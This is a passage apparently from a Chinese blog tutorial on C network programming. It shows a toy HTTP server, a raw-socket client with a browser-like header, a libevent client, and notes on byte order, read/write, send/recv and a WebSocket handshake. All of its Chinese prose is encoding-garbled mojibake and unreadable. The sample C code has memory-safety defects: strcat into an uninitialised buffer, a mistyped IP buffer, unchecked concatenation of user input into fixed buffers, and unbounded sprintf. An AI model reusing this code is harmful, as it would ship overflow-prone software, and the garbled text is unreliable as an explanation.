listenï¼Œå¼€å§‹æ·»åŠ ç«¯å£ if( listen(sockfd,QUEUE) == -1 ){ perror(&quot;listen error&quot;); exit(1); } // å®¢æˆ·ç«¯ä¿¡æ¯ char buff[BUFF_SIZE]; struct sockaddr_in claddr; socklen_t length = sizeof(claddr); while(1){ int sock_client = accept(sockfd,(struct sockaddr *)&amp;claddr, &amp;length); printf(&quot;%d\\n&quot;,++count); if( sock_client &lt;0 ){ perror(&quot;accept error&quot;); exit(1); } memset(buff,0,sizeof(buff)); int len = recv(sock_client,buff,sizeof(buff),0); fputs(buff,stdout); //send(sock_client,buff,len,0); char *re = joinString(&quot;&lt;h2&gt;the client said&lt;/h2&gt; &lt;br&gt; &quot;,buff); http_send(sock_client,re); close(sock_client); } fputs(&quot;Bye Cleey&quot;,stdout); close(sockfd); return 0; } void http_send(int sock_client,char *content){ char HTTP_HEADER[BUFF_SIZE],HTTP_INFO[BUFF_SIZE]; int len = strlen(content); sprintf(HTTP_HEADER,http_res_tmpl,len,&quot;text/html&quot;); len = sprintf(HTTP_INFO,&quot;%s%s&quot;,HTTP_HEADER,content); send(sock_client,HTTP_INFO,len,0); } void handle_signal(int sign){ fputs(&quot;\\nSIGNAL INTERRUPT \\nBye Cleey! \\nSAFE EXIT\\n&quot;,stdout); close(sockfd); exit(0); } char* joinString(char *s1, char *s2) { char *result = malloc(strlen(s1)+strlen(s2)+1);//+1 for the zero-terminator //in real code you would check for errors in malloc here if (result == NULL) exit (1); strcpy(result, s1); strcat(result, s2); return result; } ä½¿ç”¨æ–¹å¼: curl -X GET -d â€“header â€œContent-Type:application/jsonâ€ â€“header â€œAuthorization:JWT somerandomjwtstringandstuffsâ€ â€œhttp://127.0.0.1:8888/user&quot; ä¸€ä¸ªç®€æ˜“cè¯­è¨€httpClientå¯èƒ½é•¿è¿™æ · #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netdb.h&gt; #include &lt;netinet/in.h&gt; #include &lt;unistd.h&gt; int get_ip_by_domain(const char *domain, char *ip); // æ ¹æ®åŸŸåè·å–ip int main(int argc, char *argv[]){ if(argc!=2){ printf(&quot;please input host name %s ipn&quot;,argv[0]); return 1; } char * host = argv[1]; int sockfd; int len; struct sockaddr_in address; int result; char httpstring[1000]; char * server_ip[100]; get_ip_by_domain(host,server_ip); strcat(httpstring,&quot;GET / HTTP/1.1\\r\\n&quot;); strcat(httpstring,&quot;Host: &quot;); strcat(httpstring,host); strcat(httpstring,&quot;\\r\\n&quot;); strcat(httpstring, &quot;Connection: keep-alive\\r\\n&quot; &quot;Cache-Control: max-age=0\\r\\n&quot; &quot;Upgrade-Insecure-Requests: 1\\r\\n&quot; &quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36\\r\\n&quot; &quot;DNT: 1\\r\\n&quot; &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n&quot; &quot;Accept-Encoding: gzip, deflate, br\\r\\n&quot; &quot;Accept-Language: zh-CN,zh;q=0.9\\r\\n\\r\\n&quot;); char ch; sockfd = socket(AF_INET, SOCK_STREAM, 0); address.sin_family = AF_INET; printf(&quot;the server host is %s and the ip is %s\\n&quot;,argv[1],server_ip); address.sin_addr.s_addr = inet_addr(server_ip); address.sin_port = htons(80); len = sizeof(address); result = connect(sockfd,(struct sockaddr *)&amp;address,len); if(result == -1){ perror(&quot;oops: client connect error&quot;); return 1; } printf(&quot;befor connect!!&quot;); write(sockfd,httpstring,strlen(httpstring)); printf(&quot;after write!!\\n&quot;); while(read(sockfd,&amp;ch,1)){ printf(&quot;%c&quot;, ch); } close(sockfd); printf(&quot;n&quot;); return 0; } #define IP_SIZE 16 // æ ¹æ®åŸŸåè·å–ip int get_ip_by_domain(const char *domain, char *ip) { char **pptr; struct hostent *hptr; hptr = gethostbyname(domain); if(NULL == hptr) { printf(&quot;gethostbyname error for host:%s/n&quot;, domain); return -1; } for(pptr = hptr-&gt;h_addr_list ; *pptr != NULL; pptr++) { if (NULL != inet_ntop(hptr-&gt;h_addrtype, *pptr, ip, IP_SIZE) ) { return 0; // åªè·å–ç¬¬ä¸€ä¸ª ip } } return -1; } ä½¿ç”¨æ–¹å¼: ./bin/client www.baidu.com ##è¿™æ—¶å€™ï¼Œåœ¨ç™¾åº¦æœåŠ¡å™¨çœ‹æ¥ï¼Œè¿™ä¸ªç¨‹åºå’Œæ™®é€šçš„æµè§ˆå™¨æ²¡æœ‰åŒºåˆ«ã€‚è¯•äº†ä¸‹ä¸»æµçš„ç½‘ç«™ï¼Œéƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ä¼˜é…·è¿”å›äº†ä¸€å¤§ä¸²å¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼Œçœ‹äº†ä¸‹ï¼Œåº”è¯¥æ˜¯content-encoding: gzipäº†ï¼Œæ‰€ä»¥åœ¨ç»ˆç«¯é‡Œé¢çœ‹ä¸Šå»ä¹±ä¸ƒå…«ç³Ÿçš„ã€‚ ä¸Šé¢è¿™æ®µä¼šå¡åœ¨readé‡Œé¢ï¼Œå› ä¸ºè¯»åˆ°æœ€åä¸€ä¸ªå­—èŠ‚çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“æ˜¯æ²¡æœ‰æ›´å¤šæ•°æ®è¿˜æ˜¯ç½‘ç»œä¸å¥½å µä½äº†ã€‚éœ€è¦åœ¨æ¯ä¸€æ¬¡è¯»å®Œä¹‹åå»æ‰¾é‚£ä¸ªâ€\\r\\n\\r\\nâ€çš„ç»“æŸæ ‡å¿—ã€‚ ä¸€ä¸ªä½¿ç”¨libeventçš„ç‰ˆæœ¬çš„å®¢æˆ·ç«¯å¯ä»¥è¿™æ ·å†™ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;evhttp.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;event2/event.h&gt; #include &lt;event2/util.h&gt; #include &lt;event2/http.h&gt; #include &lt;event2/bufferevent.h&gt; void http_request_done(struct evhttp_request *req, void *arg){ char buf[8196]; int s = evbuffer_remove(req-&gt;input_buffer, &amp;buf, sizeof(buf) - 1); buf[s] = &#39;\\0&#39;; printf(&quot;%s&quot;, buf); // terminate event_base_dispatch() event_base_loopbreak((struct event_base *)arg); } char * get_tcp_socket_for_host(const char *hostname, ev_uint16_t port) { char port_buf[6]; struct evutil_addrinfo hints; struct evutil_addrinfo *answer = NULL; int err; evutil_socket_t sock; /* Convert the port to decimal. */ evutil_snprintf(port_buf, sizeof(port_buf), &quot;%d&quot;, (int)port); /* Build the hints to tell getaddrinfo how to act. */ memset(&amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; /* v4 or v6 is fine. */ hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; /* We want a TCP socket */ /* Only return addresses we can use. */ hints.ai_flags = EVUTIL_AI_ADDRCONFIG; /* Look up the hostname. */ err = evutil_getaddrinfo(hostname, port_buf, &amp;hints, &amp;answer); if (err != 0) { fprintf(stderr, &quot;Error while resolving &#39;%s&#39;: %s&quot;, hostname, evutil_gai_strerror(err)); return NULL; } /* If there was no error, we should have at least one answer. */ assert(answer); /* Just use the first answer. */ sock = socket(answer-&gt;ai_family, answer-&gt;ai_socktype, answer-&gt;ai_protocol); if (sock &lt; 0) return NULL; if (connect(sock, answer-&gt;ai_addr, answer-&gt;ai_addrlen)) { /* Note that we&#39;re doing a blocking connect in this function. * If this were nonblocking, we&#39;d need to treat some errors * (like EINTR and EAGAIN) specially. */ EVUTIL_CLOSESOCKET(sock); return NULL; } const char *s = NULL; char buf[128]; if ( answer-&gt;ai_family == AF_INET){ struct sockaddr_in *sin = (struct sockaddr_in *)answer-&gt;ai_addr; s = evutil_inet_ntop(AF_INET, &amp;sin-&gt;sin_addr, buf, 128); } else if ( answer-&gt;ai_family == AF_INET6){ struct sockaddr_in6 *sin6 = (struct sockaddr_in6 *)answer-&gt;ai_addr; s = evutil_inet_ntop(AF_INET6, &amp;sin6-&gt;sin6_addr, buf, 128); } if (s){ printf(&quot; -&gt;%s\\n&quot; , s); } char *res = (char *)malloc(sizeof(char)*strlen(s)+1); strcpy(res,s); return res; } int main(int argc, char **argv){ char *ip_addresss = get_tcp_socket_for_host(&quot;www.taobao.com&quot;,80); printf(&quot;the ip address of taobao is %s \\n&quot;,ip_addresss); struct event_base *base; struct evhttp_connection *conn; struct evhttp_request *req; base = event_base_new(); conn = evhttp_connection_base_new(base, NULL, ip_addresss, 80); req = evhttp_request_new(http_request_done, base); // è¿™é‡Œå°±æ˜¯å†™request çš„ header evhttp_add_header(req-&gt;output_headers, &quot;Host&quot;, &quot;www.taobao.com&quot;); evhttp_add_header(req-&gt;output_headers, &quot;Connection&quot;, &quot;keep-alive&quot;); evhttp_add_header(req-&gt;output_headers, &quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;); evhttp_add_header(req-&gt;output_headers, &quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;); evhttp_make_request(conn, req, EVHTTP_REQ_GET, &quot;/index.html&quot;); evhttp_connection_set_timeout(req-&gt;evcon, 600); event_base_dispatch(base); return 0; } ç½‘ç»œé€šä¿¡æ˜¾ç„¶è¿˜è¦æ³¨æ„ä¸€ä¸ªå­—èŠ‚åºçš„é—®é¢˜ï¼Œç®€å•æ¥è®²,javaæ˜¯å¤§ç«¯çš„,c++æ˜¯è·Ÿç€å¹³å°èµ°çš„ä¸”å¤šæ•°ä¸ºå°ç«¯c++çš„æœåŠ¡å™¨å’Œjavaçš„å®¢æˆ·ç«¯ä¹‹é—´çš„é€šä¿¡ C/C++è¯­è¨€ç¼–å†™çš„ç¨‹åºé‡Œæ•°æ®å­˜å‚¨é¡ºåºæ˜¯è·Ÿç¼–è¯‘å¹³å°æ‰€åœ¨çš„CPUç›¸å…³çš„ï¼Œè€Œç°åœ¨æ¯”è¾ƒæ™®éçš„ x86 å¤„ç†å™¨æ˜¯ Little EndianJAVAç¼–å†™çš„ç¨‹åºåˆ™å”¯ä¸€é‡‡ç”¨ Big Endian æ–¹å¼æ¥å­˜å‚¨æ•°æ® htons();//å°†shortç±»å‹çš„å€¼ä»ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åº(ä¸Šé¢å°±æ˜¯æŠŠç«¯å£å·è½¬åŒ–ä¸€ä¸‹)inet_addr();//å°†IPåœ°å€å­—ç¬¦ä¸²è½¬æ¢ä¸ºlongç±»å‹çš„ç½‘ç»œå­—èŠ‚åºï¼ˆæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªlongï¼‰gethostbyname();//è·å¾—ä¸è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€inet_ntoa();//å°†longç±»å‹çš„ç½‘ç»œå­—èŠ‚åºè½¬æ¢æˆIPåœ°å€å­—ç¬¦ä¸²//è¿™äº›è½¬æ¢å­—èŠ‚åºçš„å‡½æ•°æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºipåœ°å€ï¼Œç«¯å£è¿™äº›ä¸œè¥¿ä¸æ˜¯åº”ç”¨å±‚å¤„ç†ï¼Œè€Œæ˜¯ç”±è·¯ç”±å™¨è¿™äº›ä¸œè¥¿å»å¤„ç†çš„ï¼Œåè€…éµç…§ç½‘ç»œæ ‡å‡†ä½¿ç”¨çš„æ˜¯big-endianï¼Œæ‰€ä»¥å¿…é¡»è½¬æ¢å­—èŠ‚åºã€‚ è¯»å†™å‡½æ•°readå’Œwriteä»¥åŠrecvå’Œsendreadå’Œwriteå¯ä»¥æ“ä½œä»»ä½•fdï¼Œä½†æ˜¯recvå’Œsendåªèƒ½æ“ä½œsocket fdï¼Œå¥½å¤„æ˜¯å¯ä»¥è®¾ç½®ä¸€äº›flag The difference is that recv()/send() work only on socket descriptors and let you specify certain options for the actual operation. Those functions are slightly more specialized (for instance, you can set a flag to ignore SIGPIPE, or to send out-of-band messages...). Functions read()/write() are the universal file descriptor functions working on all descriptors. headeræ–‡ä»¶å°±ä¸ä¸€æ · unistd.hï¼Œå’Œsys/socket.h readå’Œwrite#include &lt;unistd.h&gt; ssize_t read(int fd,void *buf,size_t nbyte) // readå‡½æ•°æ˜¯è´Ÿè´£ä»fdä¸­è¯»å–å†…å®¹.å½“è¯»æˆåŠŸ æ—¶,readè¿”å›å®é™…æ‰€è¯»çš„å­—èŠ‚æ•°,å¦‚æœè¿”å›çš„å€¼æ˜¯0 è¡¨ç¤ºå·²ç»è¯»åˆ°æ–‡ä»¶çš„ç»“æŸäº†,å°äº0è¡¨ç¤ºå‡ºç°äº†é”™è¯¯.å¦‚æœé”™è¯¯ä¸ºEINTRè¯´æ˜è¯»æ˜¯ç”±ä¸­æ–­å¼•èµ·çš„, å¦‚æœæ˜¯ECONNRESTè¡¨ç¤ºç½‘ç»œè¿æ¥å‡ºäº†é—®é¢˜. //å†™å‡½æ•°write #include &lt;unistd.h&gt; ssize_t write(int fd, const void *buf, size_t count); // writeå‡½æ•°å°†bufä¸­çš„nbyteså­—èŠ‚å†…å®¹å†™å…¥æ–‡ä»¶æè¿°ç¬¦fd.æˆåŠŸæ—¶è¿”å›å†™çš„å­—èŠ‚æ•°.å¤±è´¥æ—¶è¿”å›-1. å¹¶è®¾ç½®errnoå˜é‡. åœ¨ç½‘ç»œç¨‹åºä¸­,å½“æˆ‘ä»¬å‘å¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦å†™æ—¶æœ‰ä¸¤å¯èƒ½. // 1)writeçš„è¿”å›å€¼å¤§äº0,è¡¨ç¤ºå†™äº†éƒ¨åˆ†æˆ–è€…æ˜¯å…¨éƒ¨çš„æ•°æ®. è¿™æ ·æˆ‘ä»¬ç”¨ä¸€ä¸ªwhileå¾ªç¯æ¥ä¸åœçš„å†™å…¥ï¼Œä½†æ˜¯å¾ªç¯è¿‡ç¨‹ä¸­çš„bufå‚æ•°å’Œnbyteå‚æ•°å¾—ç”±æˆ‘ä»¬æ¥æ›´æ–°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘ç»œå†™å‡½æ•°æ˜¯ä¸è´Ÿè´£å°†å…¨éƒ¨æ•°æ®å†™å®Œä¹‹ååœ¨è¿”å›çš„ã€‚ // 2)è¿”å›çš„å€¼å°äº0,æ­¤æ—¶å‡ºç°äº†é”™è¯¯.æˆ‘ä»¬è¦æ ¹æ®é”™è¯¯ç±»å‹æ¥å¤„ç†. // å¦‚æœé”™è¯¯ä¸ºEINTRè¡¨ç¤ºåœ¨å†™çš„æ—¶å€™å‡ºç°äº†ä¸­æ–­é”™è¯¯. // å¦‚æœä¸ºEPIPEè¡¨ç¤ºç½‘ç»œè¿æ¥å‡ºç°äº†é—®é¢˜(å¯¹æ–¹å·²ç»å…³é—­äº†è¿æ¥). sendå’Œrecvç®€å•æ¥è®²ï¼Œreadæ˜¯ä»ç³»ç»Ÿçš„ç¼“å†²åŒºè¯»å–çš„,writeæ˜¯å†™åˆ°tcp bufferé‡Œé¢çš„socket sendå‡½æ•°å’Œrecvå‡½æ•°è¯¦è§£ 1.send å‡½æ•°#include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; ssize_t send(int sockfd, const void *buf, size_t len, int flags); // ä¸è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æœåŠ¡å™¨åº”ç”¨ç¨‹åºéƒ½ç”¨sendå‡½æ•°æ¥å‘TCPè¿æ¥çš„å¦ä¸€ç«¯å‘é€æ•°æ®ã€‚å®¢æˆ·ç¨‹åºä¸€èˆ¬ç”¨sendå‡½æ•°å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨åˆ™é€šå¸¸ç”¨sendå‡½æ•°æ¥å‘å®¢æˆ·ç¨‹åºå‘é€åº”ç­”ã€‚ // è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå‘é€ç«¯å¥—æ¥å­—æè¿°ç¬¦ï¼› // ç¬¬äºŒä¸ªå‚æ•°æŒ‡æ˜ä¸€ä¸ªå­˜æ”¾åº”ç”¨ç¨‹åºè¦å‘é€æ•°æ®çš„ç¼“å†²åŒºï¼› // ç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡æ˜å®é™…è¦å‘é€çš„æ•°æ®çš„å­—èŠ‚æ•°ï¼› // ç¬¬å››ä¸ªå‚æ•°ä¸€èˆ¬ç½®0ã€‚ // è¿™é‡Œåªæè¿°åŒæ­¥socketçš„sendå‡½æ•°çš„æ‰§è¡Œæµç¨‹ã€‚å½“è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œ // ï¼ˆ1ï¼‰sendå…ˆæ¯”è¾ƒå¾…å‘é€æ•°æ®çš„é•¿åº¦lenå’Œå¥—æ¥å­—sçš„å‘é€ç¼“å†²çš„é•¿åº¦ï¼Œ å¦‚æœlenå¤§äºsçš„å‘é€ç¼“å†²åŒºçš„é•¿åº¦ï¼Œè¯¥å‡½æ•°è¿”å›SOCKET_ERRORï¼› // ï¼ˆ2ï¼‰å¦‚æœlenå°äºæˆ–è€…ç­‰äºsçš„å‘é€ç¼“å†²åŒºçš„é•¿åº¦ï¼Œé‚£ä¹ˆsendå…ˆæ£€æŸ¥åè®®æ˜¯å¦æ­£åœ¨å‘é€sçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®ï¼Œå¦‚æœæ˜¯å°±ç­‰å¾…åè®®æŠŠæ•°æ®å‘é€å®Œï¼Œå¦‚æœåè®®è¿˜æ²¡æœ‰å¼€å§‹å‘é€sçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®æˆ–è€…sçš„å‘é€ç¼“å†²ä¸­æ²¡æœ‰æ•°æ®ï¼Œé‚£ä¹ˆsendå°±æ¯”è¾ƒsçš„å‘é€ç¼“å†²åŒºçš„å‰©ä½™ç©ºé—´å’Œlen // ï¼ˆ3ï¼‰å¦‚æœlenå¤§äºå‰©ä½™ç©ºé—´å¤§å°ï¼Œsendå°±ä¸€ç›´ç­‰å¾…åè®®æŠŠsçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®å‘é€å®Œ // ï¼ˆ4ï¼‰å¦‚æœlenå°äºå‰©ä½™ ç©ºé—´å¤§å°ï¼Œsendå°±ä»…ä»…æŠŠbufä¸­çš„æ•°æ®copyåˆ°å‰©ä½™ç©ºé—´é‡Œï¼ˆæ³¨æ„å¹¶ä¸æ˜¯sendæŠŠsçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®ä¼ åˆ°è¿æ¥çš„å¦ä¸€ç«¯çš„ï¼Œè€Œæ˜¯åè®®ä¼ çš„ï¼Œsendä»…ä»…æ˜¯æŠŠbufä¸­çš„æ•°æ®copyåˆ°sçš„å‘é€ç¼“å†²åŒºçš„å‰©ä½™ç©ºé—´é‡Œï¼‰ã€‚ // å¦‚æœsendå‡½æ•°copyæ•°æ®æˆåŠŸï¼Œå°±è¿”å›å®é™…copyçš„å­—èŠ‚æ•°ï¼Œå¦‚æœsendåœ¨copyæ•°æ®æ—¶å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆsendå°±è¿”å›SOCKET_ERRORï¼›å¦‚æœsendåœ¨ç­‰å¾…åè®®ä¼ é€æ•°æ®æ—¶ç½‘ç»œæ–­å¼€çš„è¯ï¼Œé‚£ä¹ˆsendå‡½æ•°ä¹Ÿè¿”å›SOCKET_ERRORã€‚ // è¦æ³¨æ„sendå‡½æ•°æŠŠbufä¸­çš„æ•°æ®æˆåŠŸcopyåˆ°sçš„å‘é€ç¼“å†²çš„å‰©ä½™ç©ºé—´é‡Œåå®ƒå°±è¿”å›äº†ï¼Œä½†æ˜¯æ­¤æ—¶è¿™äº›æ•°æ®å¹¶ä¸ä¸€å®šé©¬ä¸Šè¢«ä¼ åˆ°è¿æ¥çš„å¦ä¸€ç«¯ã€‚å¦‚æœåè®®åœ¨åç»­çš„ä¼ é€è¿‡ç¨‹ä¸­å‡ºç°ç½‘ç»œé”™è¯¯çš„è¯ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªSocketå‡½æ•°å°±ä¼šè¿”å›SOCKET_ERRORã€‚ï¼ˆæ¯ä¸€ä¸ªé™¤sendå¤–çš„Socketå‡½æ•°åœ¨æ‰§ è¡Œçš„æœ€å¼€å§‹æ€»è¦å…ˆç­‰å¾…å¥—æ¥å­—çš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®è¢«åè®®ä¼ é€å®Œæ¯•æ‰èƒ½ç»§ç»­ï¼Œå¦‚æœåœ¨ç­‰å¾…æ—¶å‡ºç°ç½‘ç»œé”™è¯¯ï¼Œé‚£ä¹ˆè¯¥Socketå‡½æ•°å°±è¿”å› SOCKET_ERRORï¼‰ // æ³¨æ„ï¼šåœ¨Unixç³»ç»Ÿä¸‹ï¼Œå¦‚æœsendåœ¨ç­‰å¾…åè®®ä¼ é€æ•°æ®æ—¶ç½‘ç»œæ–­å¼€çš„è¯ï¼Œè°ƒç”¨sendçš„è¿›ç¨‹ä¼šæ¥æ”¶åˆ°ä¸€ä¸ªSIGPIPEä¿¡å·ï¼Œè¿›ç¨‹å¯¹è¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†æ˜¯è¿›ç¨‹ç»ˆæ­¢ã€‚ // é€šè¿‡æµ‹è¯•å‘ç°ï¼Œå¼‚æ­¥socketçš„sendå‡½æ•°åœ¨ç½‘ç»œåˆšåˆšæ–­å¼€æ—¶è¿˜èƒ½å‘é€è¿”å›ç›¸åº”çš„å­—èŠ‚æ•°ï¼ŒåŒæ—¶ä½¿ç”¨selectæ£€æµ‹ä¹Ÿæ˜¯å¯å†™çš„ï¼Œä½†æ˜¯è¿‡å‡ ç§’é’Ÿä¹‹åï¼Œå†sendå°±ä¼šå‡ºé”™äº†ï¼Œè¿”å›-1ã€‚selectä¹Ÿä¸èƒ½æ£€æµ‹å‡ºå¯å†™äº†ã€‚ 2. recvå‡½æ•°#include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; ssize_t recv(int sockfd, void *buf, size_t len, int flags); // ä¸è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æœåŠ¡å™¨åº”ç”¨ç¨‹åºéƒ½ç”¨recvå‡½æ•°ä»TCPè¿æ¥çš„å¦ä¸€ç«¯æ¥æ”¶æ•°æ®ã€‚è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæ¥æ”¶ç«¯å¥—æ¥å­—æè¿°ç¬¦ï¼› // ç¬¬äºŒä¸ªå‚æ•°æŒ‡æ˜ä¸€ä¸ªç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºç”¨æ¥å­˜æ”¾recvå‡½æ•°æ¥æ”¶åˆ°çš„æ•°æ®ï¼› // ç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡æ˜bufçš„é•¿åº¦ï¼› // ç¬¬å››ä¸ªå‚æ•°ä¸€èˆ¬ç½®0ã€‚ // è¿™é‡Œåªæè¿°åŒæ­¥Socketçš„recvå‡½æ•°çš„æ‰§è¡Œæµç¨‹ã€‚å½“åº”ç”¨ç¨‹åºè°ƒç”¨recvå‡½æ•°æ—¶ï¼Œ // ï¼ˆ1ï¼‰recvå…ˆç­‰å¾…sçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®è¢«åè®®ä¼ é€å®Œæ¯•ï¼Œå¦‚æœåè®®åœ¨ä¼ é€sçš„å‘é€ç¼“å†²ä¸­çš„æ•°æ®æ—¶å‡ºç°ç½‘ç»œé”™è¯¯ï¼Œé‚£ä¹ˆrecvå‡½æ•°è¿”å›SOCKET_ERRORï¼Œ // ï¼ˆ2ï¼‰å¦‚æœsçš„å‘é€ç¼“å†²ä¸­æ²¡æœ‰æ•°æ®æˆ–è€…æ•°æ®è¢«åè®®æˆåŠŸå‘é€å®Œæ¯•åï¼Œrecvå…ˆæ£€æŸ¥å¥—æ¥å­—sçš„æ¥æ”¶ç¼“å†²åŒºï¼Œå¦‚æœsæ¥æ”¶ç¼“å†²åŒºä¸­æ²¡æœ‰æ•°æ®æˆ–è€…åè®®æ­£åœ¨æ¥æ”¶æ•°æ®ï¼Œé‚£ä¹ˆrecvå°±ä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°åè®®æŠŠæ•°æ®æ¥æ”¶å®Œæ¯•ã€‚å½“åè®®æŠŠæ•°æ®æ¥æ”¶å®Œæ¯•ï¼Œrecvå‡½æ•°å°±æŠŠsçš„æ¥æ”¶ç¼“å†²ä¸­çš„æ•°æ®copyåˆ°bufä¸­ï¼ˆæ³¨æ„åè®®æ¥æ”¶åˆ°çš„æ•°æ®å¯èƒ½å¤§äºbufçš„é•¿åº¦ï¼Œæ‰€ä»¥ åœ¨è¿™ç§æƒ…å†µä¸‹è¦è°ƒç”¨å‡ æ¬¡recvå‡½æ•°æ‰èƒ½æŠŠsçš„æ¥æ”¶ç¼“å†²ä¸­çš„æ•°æ®copyå®Œã€‚recvå‡½æ•°ä»…ä»…æ˜¯copyæ•°æ®ï¼ŒçœŸæ­£çš„æ¥æ”¶æ•°æ®æ˜¯åè®®æ¥å®Œæˆçš„ï¼‰ï¼Œ // recvå‡½æ•°è¿”å›å…¶å®é™…copyçš„å­—èŠ‚æ•°ã€‚å¦‚æœrecvåœ¨copyæ—¶å‡ºé”™ï¼Œé‚£ä¹ˆå®ƒè¿”å›SOCKET_ERRORï¼›å¦‚æœrecvå‡½æ•°åœ¨ç­‰å¾…åè®®æ¥æ”¶æ•°æ®æ—¶ç½‘ç»œä¸­æ–­äº†ï¼Œé‚£ä¹ˆå®ƒè¿”å›0ã€‚ // æ³¨æ„ï¼šåœ¨Unixç³»ç»Ÿä¸‹ï¼Œå¦‚æœrecvå‡½æ•°åœ¨ç­‰å¾…åè®®æ¥æ”¶æ•°æ®æ—¶ç½‘ç»œæ–­å¼€äº†ï¼Œé‚£ä¹ˆè°ƒç”¨recvçš„è¿›ç¨‹ä¼šæ¥æ”¶åˆ°ä¸€ä¸ªSIGPIPEä¿¡å·ï¼Œè¿›ç¨‹å¯¹è¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†æ˜¯è¿›ç¨‹ç»ˆæ­¢ã€‚ è¿˜æœ‰å®ç°websocketåè®®çš„è§è¿‡çš„ä¸€ä¸ªwebsocketçš„è¯·æ±‚é•¿è¿™æ ·GET wss://nexus-websocket-b.xxx.io/pubsub/xxx?X-Nexus-New-Client=true&amp;X-Nexus-Version=0.4.53 HTTP/1.1Host: nexus-websocket-b.xxx.ioConnection: UpgradePragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3538.77 Safari/537.36Upgrade: websocketOrigin: https://app.xxx.ioSec-WebSocket-Version: 13Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Sec-WebSocket-Key: xaxsasdasdas==Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits Responseé•¿è¿™æ ·HTTP/1.1 101 Switching ProtocolsDate: Thu, 25 Oct 2018 06:07:10 GMTConnection: upgradeUpgrade: websocketSec-WebSocket-Accept: sasasasaD/tA= è¿™æ ·ä¹Ÿå°±å®Œæˆäº†protocol upgradeçš„è¿‡ç¨‹,webSocketæ˜¯å»ºç«‹åœ¨httpåè®®ä¸Šçš„ jså¹¶ä¸æ”¯æŒå¯¹æ“ä½œç³»ç»Ÿsocketçš„ç›´æ¥æ§åˆ¶ï¼Œå¯èƒ½æ˜¯å®‰å…¨å› ç´ (websocketå€’æ˜¯æœ‰ï¼Œä¸è¿‡é‚£æ˜¯å¦å¤–ä¸€å›äº‹äº†)ã€‚node jsæ˜¯æœ‰socketæ”¯æŒçš„`jsvar net = require(â€˜netâ€™); // è¿™ä¸ªæ˜¯tcpvar client = new net.Socket();client.connect(6000, â€œ127.0.0.1â€); client.on(â€˜dataâ€™, function (data) { console.log(â€˜!!!!!!!!:â€™ + data);}); client.on(â€˜errorâ€™, function (exception) { console.log(â€˜socket error:â€™ + exception);// client.end();}); æƒ³è¦ç”¨udpçš„è¯æœ‰require(&#39;dgram&#39;); ```c #include &lt;unistd.h&gt; ssize_t read(int fd, void *buf, size_t count); readè¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯è¯»å–çš„byteæ•°ï¼Œ(On success, the number of bytes read is returned (zero indicates end of file), and the file position is advanced by this number;On error, -1 is returned, and errno is set appropriately. In this case, it is left unspecified whether the file position (if any) changes.) 